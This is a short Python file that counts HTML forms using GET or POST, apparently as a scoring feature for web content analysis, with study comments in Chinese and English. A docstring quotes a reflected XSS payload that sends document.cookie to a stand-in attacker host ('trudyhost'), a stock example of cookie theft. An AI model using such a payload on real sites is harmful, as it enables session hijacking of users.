import re

# get: send parameters through URL in the form of querystring
# post: send via HTTP message body.
# 有可能inject malicious code into the URLs
# Q：这好像和JS关系不大？
"""
http://host/personalizedpage.php?username=<script>
document.location='http://trudyhost/cgi-bin/
stealcookie.cgi?'
+document.cookie</script>
"""


def calculate_score(js_content: str, js_path: str = ""):
    # 定义正则表达式来匹配form的method属性
    # <form后跟着至少一个空白字符，到下一个>之前的所有内容。['\"]用于匹配单引号或双引号
    get_pattern = re.compile(r"<form\s+[^>]*method=['\"]get['\"]", re.IGNORECASE)
    post_pattern = re.compile(r"<form\s+[^>]*method=['\"]post['\"]", re.IGNORECASE)

    # 使用正则表达式找到所有匹配项
    get_matches = get_pattern.findall(js_content)
    post_matches = post_pattern.findall(js_content)

    # 返回get和post的使用次数
    return len(get_matches) + len(post_matches)


# 示例使用
if __name__ == "__main__":
    js_content = """
    <form method="post" action="submit-form.php">
        <input type="text" name="username">
        <input type="submit" value="Submit">
    </form>
    <form method="get" action="search.php">
        <input type="text" name="search_query">
        <input type="submit" value="Search">
    </form>
    """
    all_count = calculate_score(js_content)
    print(f"Form method 'get'/'post' usage count: {all_count}")
